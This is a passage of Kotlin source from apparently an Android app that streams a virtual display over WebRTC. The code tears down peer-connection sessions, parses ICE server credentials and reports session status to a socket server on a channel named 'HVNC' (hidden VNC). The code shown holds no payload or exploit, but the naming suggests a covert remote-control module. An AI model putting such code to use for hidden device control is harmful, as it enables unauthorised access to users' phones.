        val session = sessions[sessionId] ?: return
        emitStatus(sessionId, false, "stopped")
        stopBandwidthMonitor(sessionId)
        releasePeerConnectionOnly(sessionId)
        releaseVideoSource(sessionId)
        session.reconnectRunnable?.let { handler.removeCallbacks(it) }
        session.reconnectRunnable = null
        session.remoteDescriptionSet = false
        session.pendingOffer = null
        session.pendingIce.clear()
        session.authVerified = false
        session.securityInitialized = false
        session.connectionState = "stopped"
        sessions.remove(sessionId)
    }

    private fun releasePeerConnectionOnly(sessionId: String) {
        val session = sessions[sessionId] ?: return
        try { session.controlChannel?.unregisterObserver() } catch (_: Exception) {}
        try { session.controlChannel?.close() } catch (_: Exception) {}
        session.controlChannel = null
        try { session.peerConnection?.close() } catch (_: Exception) {}
        try { session.peerConnection?.dispose() } catch (_: Exception) {}
        session.peerConnection = null
    }

    private fun flushPendingIce(sessionId: String) {
        val session = sessions[sessionId] ?: return
        val pc = session.peerConnection ?: return
        session.pendingIce.forEach { pc.addIceCandidate(it) }
        session.pendingIce.clear()
    }

    private fun failPeer(sessionId: String, message: String) {
        emitError(sessionId, message)
        handler.post {
            val session = sessions[sessionId] ?: return@post
            releasePeerConnectionOnly(sessionId)
            session.remoteDescriptionSet = false
            session.videoTrack?.setEnabled(false)
            session.connectionState = "failed"
            emitStatus(sessionId, session.displayManager?.isActive() == true, "ready")
        }
    }

    private fun parseIceServers(array: JSONArray?): List<PeerConnection.IceServer> {
        val result = mutableListOf<PeerConnection.IceServer>()
        if (array == null) return result
        for (i in 0 until array.length()) {
            val item = array.optJSONObject(i) ?: continue
            val urls = item.opt("urls")
            val urlList = when (urls) {
                is JSONArray -> (0 until urls.length()).mapNotNull { urls.optString(it).takeIf(String::isNotBlank) }
                is String -> listOf(urls).filter(String::isNotBlank)
                else -> emptyList()
            }
            if (urlList.isEmpty()) continue
            val builder = PeerConnection.IceServer.builder(urlList)
            item.optString("username").takeIf(String::isNotBlank)?.let(builder::setUsername)
            item.optString("credential").takeIf(String::isNotBlank)?.let(builder::setPassword)
            result.add(builder.createIceServer())
        }
        return result
    }

    // ─── Status Emission ───────────────────────────────────────────

    private fun emitStatus(sessionId: String, active: Boolean, connectionState: String) {
        val session = sessions[sessionId]
        val display = session?.displayManager
        val status = JSONObject().apply {
            put(Protocol.KEY_TYPE, Protocol.KEY_STATUS)
            put("sessionId", sessionId)
            put(Protocol.KEY_STREAMING, active)
            put(Protocol.KEY_VIRTUAL_W, display?.displayWidth ?: 0)
            put(Protocol.KEY_VIRTUAL_H, display?.displayHeight ?: 0)
            put(Protocol.KEY_DISPLAY_ID, display?.displayIdValue ?: -1)
            put(Protocol.KEY_DENSITY_DPI, display?.displayDpi ?: 0)
            put("fps", session?.targetFps ?: 30)
            put("transport", "webrtc")
            put("connectionState", connectionState)
            put("authVerified", session?.authVerified ?: false)
        }
        SocketClient.getInstance().socket?.emit(Protocol.HVNC, status)
    }

    private fun emitError(sessionId: String, message: String) {
        val error = JSONObject().apply {
            put(Protocol.KEY_TYPE, Protocol.KEY_ERROR)
            put(Protocol.KEY_ERROR, message)
            put("sessionId", sessionId)
        }
        SocketClient.getInstance().socket?.emit(Protocol.HVNC, error)
        auditLogger?.logAction(sessionId, "error", mapOf("message" to message), "webrtc", false)
    }

    private open class SimpleSdpObserver : SdpObserver {
        override fun onCreateSuccess(description: SessionDescription) = Unit
        override fun onSetSuccess() = Unit
        override fun onCreateFailure(error: String) = Unit
        override fun onSetFailure(error: String) = Unit
    }
}